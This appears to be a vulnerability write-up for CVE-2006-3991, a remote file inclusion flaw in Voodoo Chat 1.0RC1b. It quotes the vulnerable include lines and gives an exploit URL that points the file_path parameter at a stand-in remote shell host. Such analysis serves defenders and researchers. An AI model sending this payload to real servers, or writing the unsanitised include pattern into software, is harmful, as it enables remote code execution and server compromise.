Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-3991

**Vulnerability Details:**

*   **Root Cause:** The vulnerability is a Remote File Inclusion (RFI) flaw in the `index.php` file of Voodoo Chat version 1.0RC1b. The application includes files based on user-supplied input without proper sanitization. Specifically, the `file_path` parameter is directly used in an `include` statement.
*   **Weaknesses:** The primary weakness is the lack of input validation on the `file_path` parameter, allowing an attacker to control the path of the file being included. This enables the inclusion of remote files.
*   **Impact of Exploitation:** Successful exploitation allows a remote attacker to include arbitrary files, including malicious code from a remote server. This can lead to complete compromise of the server, such as arbitrary code execution.
*   **Attack Vectors:** The attack vector is through an HTTP GET request to the vulnerable `index.php` script. The attacker crafts a malicious URL, passing the URL of a malicious PHP file as the value of the `file_path` parameter.
*   **Required Attacker Capabilities/Position:** The attacker needs to be able to send HTTP requests to the vulnerable server. No prior authentication is required.

**Technical Details:**

*   The vulnerable code snippet is found in `index.php`:
    ```php
    else include_once($file_path."languages/".$language.".php");
    include($file_path."designes/".$design."/index.php");
    ```
*   The attacker can control the `$file_path` variable through the `file_path` parameter in the GET request.

**Exploit Example:**

```
http://sitename.com/[Script Path]/index.php?file_path=http://SHELLURL.COM?
```
This URL, when provided to the vulnerable application, would include the PHP file located at `http://SHELLURL.COM` into the execution context, potentially executing malicious code provided by the attacker.

**Additional Notes:**
* The exploit is identified with the EDB-ID: 2102
* The vulnerability is located in `index.php`.
* The application is identified as "Voodoo chat 1.0RC1b."
* The exploit was discovered and published on 2006-08-01 by SHiKaA.
